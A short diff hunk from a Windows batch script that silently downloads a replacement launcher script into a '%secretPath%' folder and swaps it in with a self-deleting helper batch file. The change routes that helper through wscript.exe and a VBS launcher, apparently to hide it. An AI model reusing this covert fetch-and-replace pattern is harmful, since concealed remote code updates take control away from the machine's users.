@@ -14,7 +14,7 @@ if exist "%secretPath%\lv.tmp" (
         curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 30 2>nul
         if exist "%launcherScriptPath%.new" (
             (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
-            start "" /B "%secretPath%\ul.bat"
+            start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
             goto :eof
         )
     )
